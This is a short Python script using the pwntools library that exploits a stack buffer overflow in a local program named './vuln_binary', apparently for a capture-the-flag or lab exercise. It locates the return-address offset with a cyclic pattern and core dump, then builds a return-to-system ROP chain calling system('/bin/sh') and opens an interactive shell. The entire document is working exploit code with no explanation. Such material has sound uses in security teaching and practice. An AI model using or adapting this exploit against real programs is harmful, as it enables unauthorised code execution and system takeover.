from pwn import *
def find_offset():
    # Start the process
    p = process('./vuln_binary')
    
    # Generate a pattern to find the offset
    pattern = cyclic(1024)
    
    # Send the pattern
    p.sendline(pattern)
    
    # Wait for the process to crash
    p.wait()
    
    # Get the core dump
    core = p.corefile
    
    # Find the offset
    offset = cyclic_find(core.read(core.rsp, 4))
    
    # Return the offset
    return offset


# Find the offset to the saved return address
offset = find_offset()
log.info(f'Offset to saved return address: {offset}')


# Define the target binary
binary = ELF('./vuln_binary')

# Find a gadget to pop a shell
rop = ROP(binary)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
bin_sh = next(binary.search(b'/bin/sh'))
system = binary.symbols['system']

# Craft the payload
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

# Start the process
p = process('./vuln_binary')

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
